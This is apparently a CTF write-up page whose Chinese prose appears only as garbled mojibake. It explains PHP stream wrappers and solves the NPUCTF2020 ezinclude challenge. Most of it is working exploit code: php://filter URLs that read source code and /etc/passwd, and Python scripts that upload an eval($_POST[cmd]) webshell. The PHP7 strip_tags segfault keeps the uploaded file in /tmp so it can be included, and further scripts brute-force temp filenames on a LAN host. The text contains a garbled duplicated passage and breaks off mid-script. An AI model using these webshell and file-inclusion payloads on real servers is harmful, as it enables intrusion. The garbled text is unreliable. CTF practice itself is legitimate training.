è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰</li><li>zlib:&#x2F;&#x2F; â€” å‹ç¼©æµ</li><li>data:&#x2F;&#x2F; â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</li><li>glob:&#x2F;&#x2F; â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</li><li>phar:&#x2F;&#x2F; â€” PHP å½’æ¡£</li><li>ssh2:&#x2F;&#x2F; â€” Secure Shell 2</li><li>rar:&#x2F;&#x2F; â€” RAR</li><li>ogg:&#x2F;&#x2F; â€” éŸ³é¢‘æµ</li><li>expect:&#x2F;&#x2F; â€” å¤„ç†äº¤äº’å¼çš„æµ</li></ul><p><em>é¦–å…ˆè¯´æ˜ä¸€ä¸‹inlude()å‡½æ•°ï¼Œä½œç”¨æ˜¯å¼•ç”¨å¤–éƒ¨æ–‡ä»¶æ¯”å¦‚è¯´html,phpç­‰ç­‰ï¼Œå®ƒå¯¹æ–‡ä»¶çš„åç¼€åæ²¡æœ‰è¦æ±‚è€Œå¯¹æ–‡ä»¶å†…å®¹æœ‰è¦æ±‚ï¼Œåªè¦æ˜¯phpçš„å†…å®¹å°±ä¼šè¢«æ‰§è¡Œ_æ³¨æ„æ˜¯æ‰§è¡Œè€Œä¸æ˜¯æ˜¾ç¤ºä»£ç </em>_</p><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><a href="#php-filter" title="php://filter"></a>php:&#x2F;&#x2F;filter</h2><p>ç”¨æ³•ï¼š</p><p><code>https://www.baidu.com?file=php://filter/...</code></p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/4.png"></p><p>å…·ä½“ç”¨æ³•ï¼š<br><a href="https://www.baidu.com/?file=php://filter/read=convert.base64-encode/resource=./index.php">https://www.baidu.com?file=php://filter/read=convert.base64-encode/resource=./index.php</a><br><a href="https://www.baidu.com/?file=php://filter/read=string.rot13/resource=./index.php">https://www.baidu.com?file=php://filter/read=string.rot13/resource=./index.php</a></p><p>ç¬¬ä¸€æ¡æ˜¯è¯»å–å½“å‰ç›®å½•ä¸‹çš„index.phpæ–‡ä»¶å¹¶ä¸”ä»¥base64ç¼–ç ï¼Œæµè§ˆå™¨å°±ä¸ä¼šæŠŠPHPä»£ç æ‰§è¡Œäº†<br>ç¬¬äºŒæ¡è·Ÿç¬¬ä¸€æ¡çš„åŒºåˆ«æ˜¯æŠŠç¼–ç æ–¹å¼å˜æˆäº†rot13ï¼Œä½†æ˜¯è¿™ç§ç¼–ç æ–¹å¼ä¸ä¼šç¼–ç &lt;?å¹¶ä¸”ä½¿å¾—å†…å®¹ä¹±ç </p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/5.png"><br>æ›´å¤šè¿‡æ»¤å™¨ï¼š</p><ul><li><p>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</p><blockquote><p>string.rot13<br>string.toupper<br>string.tolower<br>string.strip_tags(è¿‡æ»¤æ ‡ç­¾)</p></blockquote></li><li><p>è½¬æ¢è¿‡æ»¤å™¨</p><blockquote><p>convert.base64-encode<br>convert.base64-decode</p><p>convert.iconv.utf-8.utf-16beï¼Œå°†utf-8è½¬æ¢ä¸ºutf-16be</p><p>convert.quoted-printable-encodeï¼Œ æ‰“å°æ‰€æœ‰ä¸å¯è§å­—ç¬¦</p><p>convert.unquoted-printable-encodeï¼Œæ‰“å°æ‰€æœ‰å¯è§å­—ç¬¦</p><p>convert.iconv.utf-16be.utf-8 ï¼Œå°†utf-16è½¬ä¸ºutf-8</p></blockquote></li><li><p>å‹ç¼©è¿‡æ»¤å™¨</p><blockquote><p>zlib.deflate(å‹ç¼©)<br>zlib.inflate(è§£å‹)<br>bzip2.compress &amp; bzip2.decompress(åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•)</p></blockquote></li><li><p>åŠ å¯†è¿‡æ»¤å™¨</p><blockquote><p>mcrypt.tripledes<br>mdecrypt.tripledes<br>å¤šä¸ªè¿‡æ»¤å™¨ç”¨<code>|</code>éš”å¼€</p></blockquote></li></ul><h3 id="php7-segment-faultç‰¹æ€§"><a href="#php7-segment-faultç‰¹æ€§" class="headerlink" title="php7 segment faultç‰¹æ€§"></a><a href="#php7-segment-fault%E7%89%B9%E6%80%A7" title="php7 segment faultç‰¹æ€§"></a>php7 segment faultç‰¹æ€§</h3><p>php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x3D;&#x2F;etc&#x2F;passwd<br>phpæ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç° Segment Faultï¼Œè¿™æ ·å¦‚æœåœ¨æ­¤åŒæ—¶ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿å­˜åœ¨&#x2F;tmpç›®å½•ï¼Œä¸ä¼šè¢«åˆ é™¤</p><p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/challenges#[NPUCTF2020]ezinclude">https://buuoj.cn/challenges#[NPUCTF2020]ezinclude</a></p><p>æ‰“å¼€ç½‘é¡µï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æ³¨é‡Šæç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span> </span><br></pre></td></tr></table></figure><p>è¾“å…¥urlï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=1 </span><br></pre></td></tr></table></figure><p>å˜åŒ–nameçš„å€¼ï¼Œå‘ç°cookiesçš„hashå€¼åœ¨ä¸æ–­å˜åŒ–ï¼Œè¯´æ˜hashå€¼è·Ÿnameçš„å–å€¼æœ‰å…³ï¼Œä½†åˆä¸å®Œå…¨æ˜¯nameç›´æ¥çš„md5å–å€¼ï¼Œè¯´æ˜åº”è¯¥æ˜¯åŠ äº†ç›çš„ã€‚æ ¹æ®æç¤ºmd5( s e c r e t . secret. secret.name)&#x3D;&#x3D;&#x3D; p a s s ï¼Œ æˆ‘ ä»¬ çš„ h a s h å€¼ å¾ˆ æœ‰ å¯ èƒ½ æ˜¯ m d 5 ( passï¼Œæˆ‘ä»¬çš„hashå€¼å¾ˆæœ‰å¯èƒ½æ˜¯md5( passï¼Œæˆ‘ä»¬çš„hashå€¼å¾ˆæœ‰å¯èƒ½æ˜¯md5(secret.$name)ï¼Œå¦‚æœå‚æ•°passä¼ å…¥cookiesé‡Œé¢çš„hashå€¼ï¼Œå¯èƒ½å°±ä¼šæˆåŠŸã€‚</p><p>è¾“å…¥urlï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?pass=576322dd496b99d07b5b0f7fa7934a25&amp;name=1 </span><br></pre></td></tr></table></figure><p>å‘ç°å“åº”ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt; window.location.href=<span class="string">&quot;flflflflag.php&quot;</span>; &lt;/script&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--<span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span> --&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>å°è¯•è®¿é—®flflflflag.phpï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php </span><br></pre></td></tr></table></figure><p>å“åº”ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt; window.location.href=<span class="string">&quot;404.html&quot;</span>; &lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>å‘ç°æ–‡ä»¶åŒ…å«ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¯ä»¥æŸ¥çœ‹æºç ï¼Œè¾“å…¥urlï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flflflflag.php </span></span><br></pre></td></tr></table></figure><p>ç”¨BurpSuiteæ‹¦æˆªå“åº”ï¼Œbase64è§£ç åå¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç›®å½•æ‰«æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81/ -e * --<span class="built_in">timeout</span>=2 -t 1 -x 400,403,404,500,503,429 -w db/dict_mode_dict.txt </span><br></pre></td></tr></table></figure><p>å­—å…¸é“¾æ¥ï¼š</p><p><a href="https://github.com/H4ckForJob/dirmap/blob/master/data/dict_mode_dict.txt">dirmap&#x2F;dict_mode_dict.txt at master Â· H4ckForJob&#x2F;dirmap</a></p><p>æ‰«æç»“æœï¼šdir.phpï¼Œå¯ä»¥æŸ¥çœ‹æºç ï¼Œè¾“å…¥urlï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=dir.php </span></span><br></pre></td></tr></table></figure><p>ç”¨Burpsuiteæ‹¦æˆªå“åº”ï¼Œbase64è§£ç åæºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/tmp&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>dir.phpèƒ½æ‰“å°ä¸´æ—¶æ–‡ä»¶å¤¹é‡Œçš„å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•æŠŠæ–‡ä»¶å­˜åˆ°tmpæ–‡ä»¶å¤¹ä¸­ã€‚</p><h4 id="æ–¹æ³•ä¸€-åˆ©ç”¨php7-segment-faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨php7-segment-faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ åˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰"></a>æ–¹æ³•ä¸€ åˆ©ç”¨php7 segment faultç‰¹æ€§ï¼ˆCVE-2018-14884ï¼‰</h4><p>phpä»£ç ä¸­ä½¿ç”¨php:&#x2F;&#x2F;filterçš„ strip_tags è¿‡æ»¤å™¨, å¯ä»¥è®© php æ‰§è¡Œçš„æ—¶å€™ç›´æ¥å‡ºç° Segment Fault , è¿™æ · php çš„åƒåœ¾å›æ”¶æœºåˆ¶å°±ä¸ä¼šåœ¨ç»§ç»­æ‰§è¡Œ , å¯¼è‡´ POST çš„æ–‡ä»¶ä¼šä¿å­˜åœ¨ç³»ç»Ÿçš„ç¼“å­˜ç›®å½•ä¸‹ä¸ä¼šè¢«æ¸…é™¤è€Œä¸åƒphpinfoé‚£æ ·ä¸Šä¼ çš„æ–‡ä»¶å¾ˆå¿«å°±ä¼šè¢«åˆ é™¤ï¼Œè¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬åªéœ€è¦çŸ¥é“å…¶æ–‡ä»¶åå°±å¯ä»¥åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚</p><p>ä½¿ç”¨php:&#x2F;&#x2F;filter&#x2F;string.strip_tagså¯¼è‡´phpå´©æºƒæ¸…ç©ºå †æ ˆé‡å¯ï¼Œå¦‚æœåœ¨åŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•ï¼ŒçŸ¥é“æ–‡ä»¶åå°±å¯ä»¥getshellã€‚è¿™ä¸ªå´©æºƒåŸå› æ˜¯å­˜åœ¨ä¸€å¤„ç©ºæŒ‡é’ˆå¼•ç”¨ã€‚å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™ï¼Œä¸´æ—¶æ–‡ä»¶ä¼šè¢«ä¿å­˜åœ¨upload_tmp_diræ‰€æŒ‡å®šçš„ç›®å½•ä¸‹ï¼Œé»˜è®¤ä¸ºtmpæ–‡ä»¶å¤¹ã€‚</p><p>è¯¥æ–¹æ³•ä»…é€‚ç”¨äºä»¥ä¸‹php7ç‰ˆæœ¬ï¼Œphp5å¹¶ä¸å­˜åœ¨è¯¥å´©æºƒã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤</li><li>php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤</li><li>php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤</li><li>å¯ä»¥è·å–æ–‡ä»¶å</li><li>æºä»£ç å°†GETå‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«</li></ul><p>References</p><p><a href="https://www.shawroot.cc/1159.html">[NPUCTF2020]ezincludeï¼ˆPHPä¸´æ—¶æ–‡ä»¶åŒ…å«ï¼‰ - ã€Œé…æªæœ±ä¸½å¶ã€‚ã€</a></p><p><a href="https://www.codenong.com/cs106498971/">PHP LFI åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶ Getshell å§¿åŠ¿</a></p><p>å¯ä»¥åˆ©ç”¨urlï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/flflflflag.php?file=php:<span class="comment">//filter/string.strip_tags/resource=/etc/passwd </span></span><br></pre></td></tr></table></figure><p>ç°åœ¨å¼€å§‹åˆ©ç”¨ä¸Šé¢çš„urlï¼Œç¼–å†™pythonè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO <span class="comment">#BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>) </span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬åè®¿é—®&#x2F;dir.phpï¼Œå¾—åˆ°tmpç›®å½•ä¸‹åˆšåˆšæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ï¼š&#x2F;tmp&#x2F;phpaRaCPM</p><p>åˆ©ç”¨BurpSuiteå‘é€è¯·æ±‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flflflflag.php?file=/tmp/phpaRaCPM HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b75582fa-<span class="number">5</span>dab-<span class="number">4</span>f76-<span class="number">8734</span>-<span class="number">1</span>c591cb88d31.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">14</span></span><br><span class="line"></span><br><span class="line">cmd=<span class="title function_ invoke__">phpinfo</span>(); </span><br></pre></td></tr></table></figure><p>åœ¨å“åº”é‡Œå¾—åˆ°flagï¼Œè—åœ¨phpinfo()é‡Œã€‚</p><p>ä¹Ÿå¯ä»¥ä¿®æ”¹è„šæœ¬ï¼Œç›´æ¥é€šè¿‡ä¸Šä¼ çš„æ–‡ä»¶åè®¿é—®phpinfo()ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">file_data=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">&quot;&lt;?php eval($_POST[cmd]);&quot;</span>.encode())</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://d25d00be-1f7f-4fe4-872c-c951e304b522.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬åè®¿é—®&#x2F;dir.phpï¼Œå¾—åˆ°tmpç›®å½•ä¸‹åˆšåˆšæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„ï¼š&#x2F;tmp&#x2F;phppvB8A6</p><p>å‘é€è¯·æ±‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /flflflflag.php?file=/tmp/phppvB8A6 HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b75582fa-<span class="number">5</span>dab-<span class="number">4</span>f76-<span class="number">8734</span>-<span class="number">1</span>c591cb88d31.node4.buuoj.cn:<span class="number">81</span> </span><br><span class="line"></span><br><span class="line">cmd=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>åœ¨å“åº”é‡Œå¾—åˆ°flagï¼Œè—åœ¨phpinfo()é‡Œã€‚</p><p>åœ¨ctfä¸­å¯èƒ½ä¼šç»™å‡ºdir.phpï¼Œä¸ºäº†é¿å…è¿›è¡Œçˆ†ç ´æ–‡ä»¶åï¼Œä½†æ˜¯åœ¨å®é™…çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œå¤§éƒ¨åˆ†æ˜¯æ²¡æ³•çŸ¥é“ä¸´æ—¶æ–‡ä»¶åçš„ï¼Œæ­¤æ—¶å°±éœ€è¦çˆ†ç ´ã€‚<br>ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.43.155&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_tmp_files</span>():</span><br><span class="line">    webshell_content = <span class="string">&#x27;&lt;?php eval($_REQUEST[c]);?&gt;&#x27;</span>.encode(</span><br><span class="line">        <span class="string">&quot;base64&quot;</span>).strip()</span><br><span class="line">    file_content = <span class="string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/ssh_session_HD89q2&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;flag&quot;;&#125;?&gt;&#x27;</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">&quot;%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = <span class="built_in">len</span>(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>çˆ†ç ´tempæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.43.155&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_tmp_files</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                            filename = i + j + k + l + m + n</span><br><span class="line">                            url = <span class="string">&quot;%s/include.php?f=/tmp/php%s&quot;</span> % (</span><br><span class="line">                                base_url, filename)</span><br><span class="line">                            <span class="built_in">print</span> url</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                response = requests.get(url)</span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                    <span class="built_in">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                                <span 